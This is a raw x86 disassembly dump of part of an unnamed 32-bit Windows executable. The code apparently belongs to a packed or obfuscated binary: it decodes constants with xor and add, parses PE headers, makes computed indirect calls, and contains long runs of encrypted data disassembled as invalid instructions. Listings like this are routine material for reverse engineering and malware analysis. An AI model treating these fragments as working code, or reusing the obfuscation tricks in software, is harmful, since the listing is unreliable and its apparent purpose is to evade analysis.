  406174:	xor    eax,esi
  406176:	add    eax,ebx
  406178:	mov    DWORD PTR [ebp+0x10],eax
  40617b:	mov    eax,ds:0x4091a0
  406180:	mov    DWORD PTR [ebp+0x10],eax
  406183:	mov    eax,DWORD PTR [ebp+0xc]
  406186:	mov    DWORD PTR [ebp+0x10],eax
  406189:	mov    eax,DWORD PTR [ebp+0x10]
  40618c:	push   0x4
  40618e:	pop    ecx
  40618f:	sub    ecx,eax
  406191:	add    ecx,DWORD PTR [ebp-0x60]
  406194:	mov    DWORD PTR [ebp-0x34],edi
  406197:	mov    DWORD PTR [ebp-0x10],ecx
  40619a:	mov    DWORD PTR [ebp-0xc8],0xf89c8531
  4061a4:	mov    eax,DWORD PTR [ebp+0x10]
  4061a7:	mov    DWORD PTR [ebp-0xc4],eax
  4061ad:	mov    eax,DWORD PTR [ebp-0x10]
  4061b0:	mov    DWORD PTR [ebp-0xc0],eax
  4061b6:	mov    eax,DWORD PTR [ebp-0x34]
  4061b9:	xor    eax,esi
  4061bb:	add    eax,ebx
  4061bd:	mov    DWORD PTR [ebp-0xbc],eax
  4061c3:	lea    eax,[ebp-0x80]
  4061c6:	mov    DWORD PTR [ebp-0xb8],eax
  4061cc:	mov    eax,DWORD PTR [ebp-0xc8]
  4061d2:	xor    eax,esi
  4061d4:	add    eax,ebx
  4061d6:	mov    DWORD PTR [ebp-0xc8],eax
  4061dc:	lea    eax,[ebp-0xc8]
  4061e2:	push   eax
  4061e3:	mov    eax,DWORD PTR [ebp-0x8]
  4061e6:	xor    eax,esi
  4061e8:	add    eax,ebx
  4061ea:	push   eax
  4061eb:	mov    eax,ds:0x4091c0
  4061f0:	push   0x409116
  4061f5:	push   DWORD PTR [eax]
  4061f7:	call   0x406f1d
  4061fc:	and    DWORD PTR [ebp+0xc],0x0
  406200:	mov    eax,DWORD PTR [ebp-0x10]
  406203:	sub    eax,DWORD PTR [ebp+0xc]
  406206:	push   eax
  406207:	mov    eax,DWORD PTR [ebp+0x10]
  40620a:	add    eax,DWORD PTR [ebp+0xc]
  40620d:	push   eax
  40620e:	call   0x40196f
  406213:	inc    DWORD PTR [ebp+0xc]
  406216:	cmp    DWORD PTR [ebp+0xc],0x52
  40621a:	jb     0x406200
  406220:	mov    eax,DWORD PTR [ebp-0x8]
  406223:	mov    eax,ds:0x4091a0
  406228:	mov    DWORD PTR [ebp+0x10],eax
  40622b:	mov    eax,ds:0x4092ac
  406230:	mov    DWORD PTR [ebp-0x68],eax
  406233:	mov    DWORD PTR [ebp+0xc],0xf89c8535
  40623a:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  406241:	mov    eax,DWORD PTR [ebp+0xc]
  406244:	xor    eax,esi
  406246:	add    eax,ebx
  406248:	mov    DWORD PTR [ebp-0x7c],eax
  40624b:	mov    DWORD PTR [ebp-0x70],0xf89cb535
  406252:	mov    DWORD PTR [ebp-0x84],0xf89f0535
  40625c:	mov    DWORD PTR [ebp-0x78],edi
  40625f:	mov    DWORD PTR [ebp-0x64],0xf89c85d5
  406266:	mov    eax,DWORD PTR [ebp+0xc]
  406269:	xor    eax,esi
  40626b:	add    eax,ebx
  40626d:	mov    DWORD PTR [ebp-0x38],eax
  406270:	mov    DWORD PTR [ebp-0x48],0xf89c8530
  406277:	mov    BYTE PTR [ebp-0x29],0x57
  40627b:	mov    eax,DWORD PTR [ebp+0xc]
  40627e:	xor    eax,esi
  406280:	add    eax,ebx
  406282:	mov    DWORD PTR [ebp-0x38],eax
  406285:	mov    eax,DWORD PTR [ebp-0x64]
  406288:	xor    eax,esi
  40628a:	add    eax,ebx
  40628c:	push   eax
  40628d:	mov    eax,DWORD PTR [ebp-0x70]
  406290:	xor    eax,esi
  406292:	add    eax,ebx
  406294:	push   eax
  406295:	mov    eax,DWORD PTR [ebp-0x48]
  406298:	xor    eax,esi
  40629a:	add    eax,ebx
  40629c:	push   eax
  40629d:	lea    eax,[ebp-0x10c]
  4062a3:	push   eax
  4062a4:	push   DWORD PTR [ebp+0xc]
  4062a7:	push   DWORD PTR [ebp-0x4]
  4062aa:	call   0x40467f
  4062af:	test   eax,eax
  4062b1:	je     0x4062e2
  4062b7:	lea    eax,[ebp-0x10c]
  4062bd:	push   eax
  4062be:	mov    eax,DWORD PTR [ebp-0x4]
  4062c1:	xor    eax,esi
  4062c3:	add    eax,ebx
  4062c5:	push   eax
  4062c6:	mov    eax,DWORD PTR [ebp+0x10]
  4062c9:	add    eax,0xaa
  4062ce:	push   eax
  4062cf:	mov    eax,DWORD PTR [ebp+0x10]
  4062d2:	mov    eax,DWORD PTR [eax+0x198]
  4062d8:	push   DWORD PTR [eax]
  4062da:	call   0x406f1d
  4062df:	mov    DWORD PTR [ebp-0x24],eax
  4062e2:	cmp    DWORD PTR [ebp-0x24],0x0
  4062e6:	lea    edi,[ebp+0x4]
  4062e9:	mov    DWORD PTR [ebp-0x7c],edi
  4062ec:	je     0x4063b6
  4062f2:	lea    eax,[ebp-0x38]
  4062f5:	push   eax
  4062f6:	mov    eax,DWORD PTR [ebp-0x78]
  4062f9:	xor    eax,esi
  4062fb:	add    eax,ebx
  4062fd:	push   eax
  4062fe:	mov    eax,DWORD PTR [ebp-0x48]
  406301:	xor    eax,esi
  406303:	add    eax,ebx
  406305:	push   eax
  406306:	push   DWORD PTR [ebp-0x24]
  406309:	lea    eax,[ebp-0x10c]
  40630f:	push   eax
  406310:	push   DWORD PTR [ebp+0xc]
  406313:	push   DWORD PTR [ebp-0x4]
  406316:	call   0x404cef
  40631b:	test   eax,eax
  40631d:	je     0x40634b
  406323:	lea    eax,[ebp-0x10c]
  406329:	push   eax
  40632a:	mov    eax,DWORD PTR [ebp-0x4]
  40632d:	xor    eax,esi
  40632f:	add    eax,ebx
  406331:	push   eax
  406332:	mov    eax,DWORD PTR [ebp+0x10]
  406335:	add    eax,0xee
  40633a:	push   eax
  40633b:	mov    eax,DWORD PTR [ebp+0x10]
  40633e:	mov    eax,DWORD PTR [eax+0x198]
  406344:	push   DWORD PTR [eax]
  406346:	call   0x406f1d
  40634b:	mov    ecx,DWORD PTR [ebp-0x48]
  40634e:	xor    ecx,esi
  406350:	mov    eax,0xffcd8d62
  406355:	sub    eax,ecx
  406357:	sub    eax,DWORD PTR [ebp-0x24]
  40635a:	mov    ecx,DWORD PTR [ebp-0x68]
  40635d:	add    ecx,eax
  40635f:	mov    eax,DWORD PTR [ebp-0x24]
  406362:	mov    DWORD PTR [eax+0x1],ecx
  406365:	mov    al,BYTE PTR [ebp-0x29]
  406368:	mov    ecx,DWORD PTR [ebp-0x24]
  40636b:	xor    al,0x49
  40636d:	sub    al,0x35
  40636f:	mov    BYTE PTR [ecx],al
  406371:	lea    eax,[ebp-0x24]
  406374:	inc    BYTE PTR [eax]
  406376:	inc    eax
  406377:	push   eax
  406378:	pop    ecx
  406379:	dec    ecx
  40637a:	xchg   ecx,edx
  40637c:	dec    BYTE PTR [edx]
  40637e:	push   DWORD PTR [ebp+0x10]
  406381:	mov    eax,ds:0x40925c
  406386:	mov    eax,DWORD PTR [eax]
  406388:	push   DWORD PTR [eax]
  40638a:	lea    eax,ds:0x409278
  406390:	push   DWORD PTR [eax]
  406392:	lea    eax,ds:0x409024
  406398:	push   DWORD PTR [eax]
  40639a:	lea    eax,ds:0x409258
  4063a0:	push   DWORD PTR [eax]
  4063a2:	lea    eax,ds:0x409390
  4063a8:	push   DWORD PTR [eax]
  4063aa:	xchg   ebx,edx
  4063ac:	inc    ebx
  4063ad:	inc    ebx
  4063ae:	sub    ebx,0x3
  4063b1:	push   ebx
  4063b2:	pop    eax
  4063b3:	call   DWORD PTR [eax+0x1]
  4063b6:	mov    DWORD PTR [ebp-0x6c],edi
  4063b9:	mov    eax,DWORD PTR [ebp-0x3c]
  4063bc:	mov    eax,DWORD PTR [ebp-0x18]
  4063bf:	push   DWORD PTR [ebp-0x20]
  4063c2:	lea    eax,[ebp-0x6c]
  4063c5:	push   eax
  4063c6:	call   0x4034f6
  4063cb:	mov    eax,ds:0x4091a0
  4063d0:	push   0x4
  4063d2:	add    eax,0x1cc
  4063d7:	push   eax
  4063d8:	lea    eax,[ebp-0x3c]
  4063db:	push   eax
  4063dc:	call   0x402c87
  4063e1:	mov    eax,DWORD PTR [ebp-0x3c]
  4063e4:	mov    eax,DWORD PTR [eax]
  4063e6:	pop    edi
  4063e7:	pop    esi
  4063e8:	pop    ebx
  4063e9:	leave  
  4063ea:	ret    0xc
  4063ed:	push   ebp
  4063ee:	mov    ebp,esp
  4063f0:	sub    esp,0x20
  4063f3:	leave  
  4063f4:	ret    0x4
  4063f7:	push   ebp
  4063f8:	mov    ebp,esp
  4063fa:	push   ecx
  4063fb:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  406402:	sub    eax,DWORD PTR ds:0x4292d9
  406408:	mov    eax,DWORD PTR [ebp+0x8]
  40640b:	or     DWORD PTR ds:0x42759c,0x4292bd
  406415:	mov    al,BYTE PTR [eax]
  406417:	add    al,0x35
  406419:	and    DWORD PTR ds:0x427cf7,0x42c89e
  406423:	xor    al,0x49
  406425:	mov    DWORD PTR ds:0x4292a9,0x8ce
  40642f:	cmp    al,0xcb
  406431:	mov    DWORD PTR ds:0x4292d5,0x323c
  40643b:	jne    0x4064e2
  406441:	and    DWORD PTR ds:0x4292c1,0x0
  40644b:	xor    ecx,ecx
  40644d:	or     ecx,DWORD PTR ds:0x4292c1
  406453:	inc    ecx
  406454:	mov    DWORD PTR ds:0x4292c1,ecx
  40645a:	cmp    DWORD PTR ds:0x4292c1,0xa
  406461:	jne    0x40647a
  406467:	push   DWORD PTR [ebp-0x18]
  40646a:	push   0x641f
  40646f:	push   0x4275a8
  406474:	call   DWORD PTR ds:0x427ac3
  40647a:	cmp    DWORD PTR ds:0x4292c1,0x9
  406481:	jne    0x406496
  406487:	xor    ecx,ecx
  406489:	or     ecx,DWORD PTR ds:0x4292c1
  40648f:	inc    ecx
  406490:	mov    DWORD PTR ds:0x4292c1,ecx
  406496:	cmp    DWORD PTR ds:0x4292c1,0x1d
  40649d:	jb     0x40644b
  4064a3:	mov    eax,DWORD PTR [ebp+0x8]
  4064a6:	mov    ecx,DWORD PTR [ebp+0x8]
  4064a9:	add    ecx,DWORD PTR [eax+0x3c]
  4064ac:	mov    edx,0x7510857
  4064b1:	mov    DWORD PTR [ebp+0x8],ecx
  4064b4:	mov    eax,DWORD PTR [ebp-0x4]
  4064b7:	xor    eax,edx
  4064b9:	push   esi
  4064ba:	mov    esi,DWORD PTR [ebp+0x8]
  4064bd:	mov    ecx,0x32729e
  4064c2:	add    eax,ecx
  4064c4:	cmp    DWORD PTR [esi+0x54],eax
  4064c7:	pop    esi
  4064c8:	je     0x4064d6
  4064ce:	mov    eax,DWORD PTR [ebp+0x8]
  4064d1:	jmp    0x4064ef
  4064d6:	mov    eax,DWORD PTR [ebp-0x4]
  4064d9:	xor    eax,edx
  4064db:	add    eax,ecx
  4064dd:	jmp    0x4064ef
  4064e2:	mov    eax,DWORD PTR [ebp-0x4]
  4064e5:	xor    eax,0x7510857
  4064ea:	add    eax,0x32729e
  4064ef:	leave  
  4064f0:	ret    0x4
  4064f3:	push   ebp
  4064f4:	mov    ebp,esp
  4064f6:	push   ecx
  4064f7:	push   ecx
  4064f8:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  4064ff:	xor    DWORD PTR ds:0x427d1b,0x4292a5
  406509:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  406510:	mov    eax,DWORD PTR [ebp-0x4]
  406513:	push   esi
  406514:	mov    esi,DWORD PTR [ebp-0x8]
  406517:	xor    DWORD PTR ds:0x427d03,0x39
  406521:	jmp    0x40669a
  406526:	mov    al,cs:0xfbf5fbf3
  40652c:	data16 jge 0x40659b
  40652f:	inc    ecx
  406530:	xor    eax,0x3927c75e
  406535:	cmp    BYTE PTR [edi+0x29],0x7c
  406539:	jl     0x406513
  40653b:	jg     0x4065b9
  40653d:	jl     0x4064f4
  40653f:	xchg   ebp,eax
  406540:	dec    esp
  406541:	xor    eax,0xc779cc2
  406546:	mov    ebp,DWORD PTR [eax+0x35]
  406549:	mov    ch,0x4d
  40654b:	hlt    
  40654c:	fucom  st(6)
  40654e:	leave  
  40654f:	sti    
  406550:	adc    bh,dh
  406552:	push   ss
  406553:	inc    ebx
  406554:	fstp   st(7)
  406556:	add    BYTE PTR [eax-0x7bd7cffe],ch
  40655c:	in     eax,0x20
  40655e:	pop    ds
  40655f:	jbe    0x406559
  406561:	pop    gs
  406563:	sti    
  406564:	cwde   
  406565:	push   eax
  406566:	xor    dl,dl
  406568:	dec    eax
  406569:	mov    eax,ds:0xa9b4ccd
  40656e:	sub    BYTE PTR [esi-0x48c1fbc8],bh
  406574:	fcmovnbe st,st(1)
  406576:	jge    0x406501
  406578:	fnstcw WORD PTR [ebx]
  40657a:	div    DWORD PTR [ecx]
  40657c:	out    0x9e,eax
  40657e:	xor    cl,dh
  406580:	mov    cl,0x46
  406582:	xor    BYTE PTR [ebx-0x69],cl
  406585:	das    
  406586:	sbb    cl,BYTE PTR [edi-0x3f]
  406589:	cmp    DWORD PTR [ecx+0x3835ef14],eax
  40658f:	adc    eax,0xbad724c1
  406594:	nop
  406595:	(bad)  
  406596:	(bad)  
  406597:	pop    esi
  406598:	mov    cl,0xb0
  40659a:	mov    cl,0xd3
  40659c:	fldenv [ebx-0x6b05a8c7]
  4065a2:	popf   
  4065a3:	xor    al,BYTE PTR [edx+0x73]
  4065a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065a7:	ja     0x40661f
  4065a9:	sbb    al,0xf4
  4065ab:	ss xchg dh,bh
  4065ae:	pop    edi
  4065af:	shr    DWORD PTR [esi+0xeb33891],1
  4065b5:	sar    DWORD PTR [eax-0x48],0x3e
  4065b9:	(bad)  
  4065bb:	sbb    eax,DWORD PTR es:[edx-0x7fb5d828]
  4065c2:	ins    DWORD PTR es:[edi],dx
  4065c3:	jge    0x406602
  4065c5:	fldcw  WORD PTR [esi-0x35]
  4065c8:	adc    bl,cl
  4065ca:	jae    0x40662d
  4065cc:	jg     0x4065b6
  4065ce:	add    al,BYTE PTR [edx-0xe]
  4065d1:	and    BYTE PTR [eax+0x7b],ah
  4065d4:	dec    ebp
  4065d5:	ret    
  4065d6:	sahf   
  4065d7:	(bad)  
  4065d9:	inc    esp
  4065da:	mov    ds:0xb8cdac15,al
  4065df:	stc    
  4065e0:	dec    ebx
  4065e1:	ss jno 0x40663c
  4065e4:	xchg   ecx,eax
  4065e5:	jl     0x4065bd
  4065e7:	push   ebx
  4065e8:	jae    0x406605
  4065ea:	stc    
  4065eb:	fwait
  4065ec:	retf   
  4065ed:	call   0x6eaed5d1
  4065f2:	int    0x1a
  4065f4:	jbe    0x406590
  4065f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065f7:	sbb    eax,0xdcac76d0
  4065fc:	pop    ebx
  4065fd:	xchg   edi,eax
  4065fe:	gs jnp 0x406623
  406601:	repnz icebp 
  406603:	fcmovu st,st(6)
  406605:	fdivr  QWORD PTR [edi+eiz*1+0x9]
  406609:	jne    0x406643
  40660b:	sar    BYTE PTR [esi+0x51],cl
  40660e:	push   0xc
  406610:	and    edx,ecx
  406612:	in     eax,0x28
  406614:	fwait
  406615:	and    al,0xa8
  406617:	lea    eax,[eax+ecx*2+0x8]
  40661b:	arpl   WORD PTR [edx+0x48838a8],di
  406621:	ja     0x406608
  406623:	jle    0x4065ea
  406625:	hlt    
  406626:	sbb    al,0xe7
  406628:	jmp    0x7658531b
  40662d:	mov    al,es:0xc0293756
  406633:	inc    eax
  406634:	repz loop 0x406611
  406637:	mov    edx,0x945a44a3
  40663c:	icebp  
  40663d:	inc    edx
  40663e:	stos   BYTE PTR es:[edi],al
  40663f:	inc    DWORD PTR [esi]
  406641:	jo     0x406657
  406643:	push   ds
  406644:	retf   0xe95b
  406647:	sbb    al,BYTE PTR [ebx+0x3843184d]
  40664d:	ret    
  40664e:	clc    
  40664f:	mov    ds:0xc14d4f57,eax
  406654:	pop    edi
  406655:	dec    esp
  406656:	test   DWORD PTR [ebx],edx
  406658:	popf   
  406659:	xor    eax,0xfc61a27c
  40665e:	out    dx,al
  40665f:	gs xor eax,0x73c388bc
  406665:	lds    ebx,FWORD PTR [ebx-0x142892a8]
  40666b:	adc    cl,ch
  40666d:	fdivp  st(4),st
  40666f:	loop   0x406649
  406671:	inc    ecx
  406672:	arpl   WORD PTR [edx-0x7e],bx
  406675:	sbb    eax,0x905d61e6
  40667a:	xor    ebx,DWORD PTR [esi+0x78]
  40667d:	(bad)  
  40667e:	aad    0xf8
  406680:	mov    al,0xa3
  406682:	mov    ebx,0xeac3e45a
  406687:	lock int3 
  406689:	or     edx,ecx
  40668b:	je     0x4066e0
  40668d:	ja     0x40668f
  40668f:	jns    0x406624
  406691:	cmc    
  406692:	cmc    
  406693:	add    ch,BYTE PTR [edx-0x4d]
  406696:	or     eax,0xbafb4c5d
  40669b:	push   edi
  40669c:	or     BYTE PTR [ecx+0x7],dl
  40669f:	xor    eax,edx
  4066a1:	adc    DWORD PTR ds:0x4292a5,0x7cf1
  4066ab:	xor    esi,edx
  4066ad:	mov    ecx,0x32729e
  4066b2:	sbb    DWORD PTR ds:0x42c89a,0x427594
  4066bc:	add    esi,ecx
  4066be:	or     DWORD PTR ds:0x42c892,0x2710
  4066c8:	add    eax,ecx
  4066ca:	sbb    DWORD PTR ds:0x4292b5,0x4275ac
  4066d4:	imul   eax,esi
  4066d7:	mov    DWORD PTR ds:0x42c896,0x5e2a
  4066e1:	mov    esi,DWORD PTR [ebp+0xc]
  4066e4:	mov    DWORD PTR ds:0x427d03,0x704c
  4066ee:	cmp    esi,eax
  4066f0:	mov    DWORD PTR ds:0x427d1f,0x38e6
  4066fa:	jne    0x4068f9
  406700:	mov    DWORD PTR ds:0x4275b0,0x11
  40670a:	cmp    DWORD PTR ds:0x4275b0,0x0
  406711:	je     0x40675a
  406717:	cmp    DWORD PTR ds:0x4275b0,0x1b
  40671e:	jne    0x406746
  406724:	push   DWORD PTR [ebp-0x28]
  406727:	push   0x3cc8
  40672c:	push   0x5307
  406731:	push   0x1b9a
  406736:	push   0x3e4a
  40673b:	push   0x4274
  406740:	call   DWORD PTR ds:0x427c6b
  406746:	xor    esi,esi
  406748:	or     esi,DWORD PTR ds:0x4275b0
  40674e:	dec    esi
  40674f:	mov    DWORD PTR ds:0x4275b0,esi
  406755:	jmp    0x40670a
  40675a:	mov    eax,DWORD PTR [ebp-0x4]
  40675d:	xor    esi,esi
  40675f:	xor    esi,DWORD PTR ds:0x42c8de
  406765:	mov    esi,DWORD PTR [esi]
  406767:	adc    DWORD PTR ds:0x4292d5,esi
  40676d:	mov    esi,DWORD PTR [ebp-0x8]
  406770:	xor    eax,edx
  406772:	xor    esi,edx
  406774:	add    eax,ecx
  406776:	add    esi,ecx
  406778:	jmp    0x4068f1
  40677d:	dec    eax
  40677e:	cmp    al,0x31
  406780:	and    ecx,DWORD PTR [ebp+0x25]
  406783:	jp     0x4067ec
  406785:	pop    edx
  406786:	inc    esp
  406787:	push   cs
  406788:	and    eax,0x876aa862
  40678d:	fld    TBYTE PTR [eax]
  40678f:	jl     0x40680d
  406791:	fdivr  DWORD PTR [edi+0x7c]
  406794:	jl     0x40673e
  406796:	add    esp,DWORD PTR [ecx-0x650d3d6a]
  40679c:	jge    0x4067b1
  40679e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40679f:	jge    0x4067e9
  4067a1:	push   ecx
  4067a2:	out    0xa7,al
  4067a4:	pusha  
  4067a5:	adc    BYTE PTR [esi-0x5818f1b8],ch
  4067ab:	js     0x40673d
  4067ad:	mov    esi,0x4e24014f
  4067b2:	add    eax,0xbd1e4df3
  4067b7:	cdq    
  4067b8:	push   edx
  4067b9:	stos   BYTE PTR es:[edi],al
  4067ba:	mov    bh,0xd1
  4067bc:	pop    ecx
  4067bd:	(bad)
  4067c0:	mov    esp,0xf0260431
  4067c5:	mov    al,ds:0xdc4b9a8
  4067ca:	icebp  
  4067cb:	add    al,0x6d
  4067cd:	leave  
  4067ce:	jnp    0x4067f6
  4067d0:	and    edi,edx
  4067d2:	nop
  4067d3:	es icebp 
  4067d5:	retf   0xdcea
  4067d8:	aas    
  4067d9:	nop
  4067da:	jmp    0x8b4f:0xf59da0b0
  4067e1:	and    BYTE PTR [eax],bl
  4067e3:	jl     0x40682d
  4067e5:	jl     0x4067de
  4067e7:	dec    ebx
  4067e8:	nop
  4067e9:	js     0x406783
  4067eb:	test   DWORD PTR [ebx+0x6becbde2],ebx
  4067f1:	ficomp DWORD PTR [ebp-0x63]
  4067f4:	ficom  DWORD PTR [eax+0x6a]
  4067f7:	dec    esi
  4067f8:	mov    ebx,0x9b3866a1
  4067fd:	push   es
  4067fe:	sbb    BYTE PTR [eax+edx*2+0x68],0x50
  406803:	test   al,0x3d
  406805:	add    edi,esi
  406807:	aas    
  406808:	aad    0x48
  40680a:	inc    edx
  40680b:	(bad)  
  40680c:	(bad)  
  40680e:	mov    bl,0x9a
  406810:	sub    ah,BYTE PTR [esp+ecx*2-0x59e21298]
  406817:	pop    ebp
  406818:	sbb    al,0xd2
  40681a:	add    al,0x11
  40681c:	sub    bh,dl
  40681e:	je     0x406800
  406820:	xchg   ecx,eax
  406821:	lahf   
  406822:	lock mov ds:0x30f81145,al
  406828:	or     al,0x7a
  40682a:	not    edi
  40682c:	icebp  
  40682d:	adc    DWORD PTR [esi+0x43],ecx
  406830:	fimul  DWORD PTR [eax+eax*4-0x6bbc060d]
  406837:	hlt    
  406838:	outs   dx,BYTE PTR ds:[esi]
  406839:	lds    bx,DWORD PTR [eax-0x30]
  40683d:	pop    es
  40683e:	pop    ebx
  40683f:	ds mov ecx,0x9d4229be
  406845:	xor    edx,DWORD PTR [edi-0x50]
  406848:	dec    esi
  406849:	mov    al,ds:0x3e46a7fb
  40684e:	ins    BYTE PTR es:[edi],dx
  40684f:	sbb    BYTE PTR [eax-0xb],bl
  406852:	inc    ebx
  406853:	and    DWORD PTR [edx+ebp*8+0x17],0x72
  406858:	cmp    DWORD PTR [edx+0x70],0x930fec4b
  40685f:	fist   DWORD PTR [edx+0x41]
  406862:	repnz push edx
  406864:	inc    ecx
  406865:	out    dx,al
  406866:	pop    eax
  406867:	xor    eax,0xe88858ec
  40686c:	mov    eax,ds:0x22b74516
  406871:	or     DWORD PTR [esi+0x761913eb],ecx
  406877:	in     al,0xe3
  406879:	mov    gs,esp
  40687b:	cmp    BYTE PTR [edi-0x6f],dh
  40687e:	clc    
  40687f:	cmp    DWORD PTR [edx],0x19
  406882:	fimul  WORD PTR [ebx-0x4]
  406885:	in     al,dx
  406886:	lea    ebx,[ebp-0x4]
  406889:	(bad)  
  40688a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40688b:	imul   esi,DWORD PTR [esi],0x2fe29eda
  406891:	sbb    ch,0xcd
  406894:	fwait
  406895:	inc    edi
  406896:	pop    ebx
  406897:	add    ch,ah
  406899:	adc    al,0xc1
  40689b:	pop    edx
  40689c:	lahf   
  40689d:	dec    edi
  40689e:	imul   esi,ebp,0xffffffca
  4068a1:	repnz or ecx,DWORD PTR [edi+0x73]
  4068a5:	inc    edi
  4068a6:	fcmovnb st,st(6)
  4068a8:	test   al,0xaa
  4068aa:	inc    ebp
  4068ab:	cmp    BYTE PTR [ebx],ah
  4068ad:	mov    ds:0x1569e352,eax
  4068b2:	sbb    BYTE PTR [eax+0x4edd99f8],ch
  4068b8:	sti    
  4068b9:	ret    
  4068ba:	pop    esi
  4068bb:	ins    DWORD PTR es:[edi],dx
  4068bc:	lahf   
  4068bd:	loopne 0x4068fc
  4068bf:	sti    
  4068c0:	stos   BYTE PTR es:[di],al
  4068c2:	inc    esi
  4068c3:	popa   
  4068c4:	lock jmp 0xa36374d0
  4068ca:	mov    ah,0x5a
  4068cc:	aad    0x64
  4068ce:	test   DWORD PTR [esi+0x3b9b345c],0xa45ff010
  4068d8:	jb     0x40690a
  4068da:	inc    DWORD PTR [edx+0x11]
  4068dd:	sbb    ebx,DWORD PTR [edi+0x7f]
  4068e0:	shr    DWORD PTR [ebp+0x38],0x5e
  4068e4:	and    al,0xd6
  4068e6:	out    0x66,al
  4068e8:	xchg   ebx,eax
  4068e9:	scas   al,BYTE PTR es:[edi]
  4068ea:	mov    ebx,DWORD PTR [ecx]
  4068ec:	int    0x22
  4068ee:	mov    al,ds:0xaf0f43a6
  4068f3:	(bad)  
  4068f4:	jmp    0x406f18
  4068f9:	mov    eax,DWORD PTR [ebp+0xc]
  4068fc:	jmp    0x406a75
  406901:	mov    eax,0x65210ec9
  406906:	stc    
  406907:	mov    ebx,0x4f39e44d
  40690c:	pop    ebp
  40690d:	scas   eax,DWORD PTR es:[edi]
  40690e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40690f:	pop    edi
  406910:	mov    ds:0x7c7c2ba7,eax
  406915:	fdivr  DWORD PTR [edi+0x7c]
  406918:	jl     0x406948
  40691a:	sub    al,0xc1
  40691c:	shr    bh,cl
  40691e:	aas    
  40691f:	cwde   
  406920:	xchg   DWORD PTR [ecx+0x745fc6ba],ebx
  406926:	dec    ebp
  406927:	fs repz cmp al,0xc7
  40692b:	push   esi
  40692c:	mov    edi,edx
  40692e:	fistp  WORD PTR [edi-0x78]
  406931:	adc    ebp,DWORD PTR [eax]
  406933:	in     eax,0xe3
  406935:	pop    ecx
  406936:	mov    bh,0x4d
  406938:	mov    edx,0xc0856a94
  40693d:	lods   al,BYTE PTR ds:[esi]
  40693e:	rcr    DWORD PTR es:[eax-0x40],1
  406942:	pusha  
  406943:	(bad)  
  406944:	nop
  406945:	mov    bh,0x46
  406947:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406949:	popf   
  40694a:	mov    bh,0xc4
  40694c:	lea    ebx,ss:[ebp-0x73]
  406950:	pop    es
  406951:	retf   0x1c68
  406954:	mov    cl,0x6
  406956:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406957:	pushf  
  406958:	pop    ss
  406959:	sbb    esp,DWORD PTR [eax+0x55]
  40695c:	sbb    al,0xae
  40695e:	stos   BYTE PTR es:[edi],al
  40695f:	jle    0x4069ab
  406961:	in     eax,0xa2
  406963:	xor    eax,0x72ff87c3
  406968:	jae    0x4069c6
  40696a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40696b:	adc    eax,DWORD PTR [ebp+0x76523559]
  406971:	xor    DWORD PTR [bx+di],esp
  406974:	push   edx
  406975:	inc    edx
  406976:	enter  0xfee7,0xd1
  40697a:	(bad)  
  40697b:	jge    0x4069b1
  40697d:	sub    esp,eax
  40697f:	out    dx,al
  406980:	cmp    esp,esi
  406982:	int3   
  406983:	lahf   
  406984:	mov    ecx,0x5a6cab77
  406989:	cdq    
  40698a:	jmp    0x3e3984e5
  40698f:	jl     0x40698a
  406991:	ins    BYTE PTR es:[edi],dx
  406992:	push   eax
  406993:	mov    cl,0xa5
  406995:	pop    es
  406996:	sub    BYTE PTR [edi-0x2c661fb1],bl
  40699c:	push   edi
  40699d:	rcr    DWORD PTR [edx-0x42],0xd3
  4069a1:	aad    0x15
  4069a3:	imul   edx,DWORD PTR [ebx-0x4f],0xe2712293
  4069aa:	fadd   st,st(3)
  4069ac:	das    
  4069ad:	cmp    DWORD PTR [ebx+0x71],ebp
  4069b0:	pop    ds
  4069b1:	ins    DWORD PTR es:[edi],dx
  4069b2:	outs   dx,BYTE PTR ds:[esi]
  4069b3:	adc    al,al
  4069b5:	lahf   
  4069b6:	push   ds
  4069b7:	mov    edx,0x6224ec7c
  4069bc:	pop    ds
  4069bd:	call   0x5ee6:0xafa928db
  4069c4:	add    BYTE PTR [eax],dh
  4069c6:	ss push 0x2e06ced0
  4069cc:	cmovb  edx,DWORD PTR [ecx-0x1ee9a3be]
  4069d3:	xchg   esp,eax
  4069d4:	mov    edi,0x194565f7
  4069d9:	mov    ebx,0xe691ef0
  4069de:	pop    ss
  4069df:	aad    0xdd
  4069e1:	jne    0x406a23
  4069e3:	adc    eax,0x1f8fcac6
  4069e8:	push   cs
  4069e9:	xchg   ecx,eax
  4069ea:	gs loop 0x406a50
  4069ed:	jns    0x4069bf
  4069ef:	aas    
  4069f0:	call   0x6b7825b6
  4069f5:	mov    bl,0x1b
  4069f7:	fs sahf 
  4069f9:	test   bh,cl
  4069fb:	cmovg  eax,DWORD PTR [ebp+0x5400f944]
  406a02:	sub    al,0x68
  406a04:	or     al,0x62
  406a06:	add    ah,BYTE PTR [edx-0x2bedc648]
  406a0c:	xor    DWORD PTR [ebx],edi
  406a0e:	mov    ebx,0x744f64b9
  406a13:	aas    
  406a14:	popa   
  406a15:	fs sar dh,cl
  406a18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a19:	xchg   esi,eax
  406a1a:	loop   0x4069d2
  406a1c:	test   al,0x41
  406a1e:	jge    0x406a6e
  406a20:	pop    esi
  406a21:	int3   
  406a22:	in     eax,dx
  406a23:	push   ds
  406a24:	cmp    DWORD PTR [ecx],esp
  406a26:	mov    al,0x98
  406a28:	mov    esp,0x6b765df9
  406a2d:	fidivr WORD PTR [edx]
  406a2f:	mov    bl,0x39
  406a31:	in     eax,dx
  406a32:	push   ds
  406a33:	je     0x406a95
  406a35:	mov    edx,0x76170e4d
  406a3a:	mov    eax,ds:0xd8828867
  406a3f:	repz jl 0x406a3a
  406a42:	dec    ebp
  406a43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a44:	xchg   ecx,eax
  406a45:	mov    bh,0x5d
  406a47:	aad    0x6d
